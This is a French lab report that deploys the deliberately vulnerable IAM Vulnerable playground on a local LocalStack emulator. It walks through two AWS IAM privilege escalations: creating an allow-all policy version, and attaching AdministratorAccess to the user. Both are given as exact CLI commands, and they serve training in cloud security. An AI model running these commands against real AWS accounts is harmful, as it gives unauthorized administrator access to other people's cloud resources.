# Rapport méthodologique — IAM Vulnerable sur LocalStack (Free Hive VPS)

**Analyste :** Jean
**Date :** 23/07/2026
**Cible :** Environnement AWS IAM émulé localement (LocalStack) — 265 ressources IAM Vulnerable (BishopFox)
**Contexte :** Adaptation d'un exercice cloud IAM privesc initialement prévu sur compte AWS réel, redéployé sur infrastructure VPS personnelle (Free Hive) après blocages successifs de quota sur comptes Azure Free Trial/Student (AzureGoat, XM Goat).

---

## 0. Prérequis

- Un compte LocalStack **personnel et gratuit** créé sur `https://app.localstack.cloud` (email + mot de passe ou SSO), avec récupération de son propre **Personal Auth Token** (section "Auth Tokens" du compte). Ce token est nominatif : la politique d'usage de LocalStack interdit le partage d'un même token entre plusieurs personnes.
- Docker installé sur la machine cible (VPS ou poste local) :
```bash
docker --version
# si absent, installation standard via le dépôt officiel Docker selon la distribution
```
- `pipx` installé (pour l'installation propre de `terraform-local` sur systèmes Ubuntu/Debian récents, protégés par PEP 668) :
```bash
pipx --version
# si absent :
sudo apt install pipx -y
pipx ensurepath
```
- AWS CLI v2 :
```bash
aws --version
# si absent, installation via winget (Windows) ou paquet officiel AWS (Linux/Mac)
```

---

## 1. Mise en place de l'environnement

### 1.1 Provisioning LocalStack (émulateur AWS local)

```bash
docker run -d --name localstack -p 4566:4566 -e LOCALSTACK_AUTH_TOKEN=<TOKEN> -e ENFORCE_IAM=1 localstack/localstack
docker ps --filter name=localstack
docker logs localstack
```

### 1.2 Configuration des outils clients

```bash
aws --version
aws configure --profile localstack
aws --profile localstack --endpoint-url=http://localhost:4566 sts get-caller-identity
```

### 1.3 Installation Terraform + wrapper tflocal

```bash
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install terraform -y
pipx install terraform-local
pipx ensurepath
tflocal --version
```

### 1.4 Déploiement du playground IAM Vulnerable

```bash
git clone https://github.com/BishopFox/iam-vulnerable
cd iam-vulnerable
tflocal init
tflocal plan -var="aws_local_profile=localstack"
tflocal apply -var="aws_local_profile=localstack"
```

Résultat : 265 ressources IAM créées (31 chemins de privilege escalation distincts).

---

## 2. Chemin d'exploitation n°1 — privesc1-CreateNewPolicyVersion

### 2.1 Obtention des accès

```bash
aws --profile localstack --endpoint-url=http://localhost:4566 iam create-access-key --user-name privesc1-CreateNewPolicyVersion-user
aws configure set aws_access_key_id <ACCESS_KEY_ID> --profile privesc1
aws configure set aws_secret_access_key <SECRET_ACCESS_KEY> --profile privesc1
aws configure set region us-east-1 --profile privesc1
aws --profile privesc1 --endpoint-url=http://localhost:4566 sts get-caller-identity
```

### 2.2 Reconnaissance

```bash
aws --profile privesc1 --endpoint-url=http://localhost:4566 iam list-attached-user-policies --user-name privesc1-CreateNewPolicyVersion-user
aws --profile privesc1 --endpoint-url=http://localhost:4566 iam get-policy --policy-arn arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion
aws --profile privesc1 --endpoint-url=http://localhost:4566 iam get-policy-version --policy-arn arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion --version-id v1
```

Vecteur identifié : permission unique `iam:CreatePolicyVersion` sur `Resource: "*"`.

### 2.3 Exploitation

```bash
cat > /tmp/admin-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

aws --profile privesc1 --endpoint-url=http://localhost:4566 iam create-policy-version --policy-arn arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion --policy-document file:///tmp/admin-policy.json --set-as-default
```

### 2.4 Vérification d'impact

```bash
aws --profile privesc1 --endpoint-url=http://localhost:4566 iam list-users --query "Users[].UserName" --output table
```

---

## 3. Chemin d'exploitation n°2 — privesc7-AttachUserPolicy

### 3.1 Obtention des accès

```bash
aws --profile localstack --endpoint-url=http://localhost:4566 iam create-access-key --user-name privesc7-AttachUserPolicy-user
aws configure set aws_access_key_id <ACCESS_KEY_ID> --profile privesc7
aws configure set aws_secret_access_key <SECRET_ACCESS_KEY> --profile privesc7
aws configure set region us-east-1 --profile privesc7
```

### 3.2 Reconnaissance

```bash
aws --profile privesc7 --endpoint-url=http://localhost:4566 iam list-attached-user-policies --user-name privesc7-AttachUserPolicy-user
aws --profile privesc7 --endpoint-url=http://localhost:4566 iam get-policy-version --policy-arn arn:aws:iam::000000000000:policy/privesc7-AttachUserPolicy --version-id v1
```

Vecteur identifié : permission unique `iam:AttachUserPolicy` sur `Resource: "*"`.

### 3.3 Exploitation

```bash
aws --profile privesc7 --endpoint-url=http://localhost:4566 iam attach-user-policy --user-name privesc7-AttachUserPolicy-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 3.4 Vérification d'impact

```bash
aws --profile privesc7 --endpoint-url=http://localhost:4566 iam list-users --query "Users[].UserName" --output table
```

---

## 4. Synthèse

| # | Chemin | Permission initiale | Technique | Résultat |
|---|--------|---------------------|-----------|----------|
| 1 | privesc1-CreateNewPolicyVersion | `iam:CreatePolicyVersion` | Modification du contenu d'une policy existante + définition comme version par défaut | Accès admin complet |
| 2 | privesc7-AttachUserPolicy | `iam:AttachUserPolicy` | Auto-attachement de la policy managée AWS `AdministratorAccess` | Accès admin complet |

**Point méthodologique commun :** dans les deux cas, une permission IAM unique et en apparence anodine (portée `Resource: "*"`) suffit à obtenir un accès administrateur complet, sans jamais toucher directement à des permissions "sensibles" explicites (type `iam:*` ou `Administrator*`). Ceci illustre l'importance de l'analyse des chemins de privesc IAM au-delà de la simple lecture des noms de policies attachées.

**Environnement technique :** LocalStack (édition avec compte gratuit + `LOCALSTACK_AUTH_TOKEN`, `ENFORCE_IAM=1`) s'est révélé être une alternative fiable et sans risque de quota/coût aux comptes cloud réels (AWS/Azure Free Trial), pour ce type d'exercice IAM. 29 chemins de privesc restants dans le playground IAM Vulnerable pour approfondissement ultérieur.

**Nettoyage à prévoir en fin d'exercice complet :**
```bash
tflocal destroy -var="aws_local_profile=localstack"
docker stop localstack
docker rm localstack
```
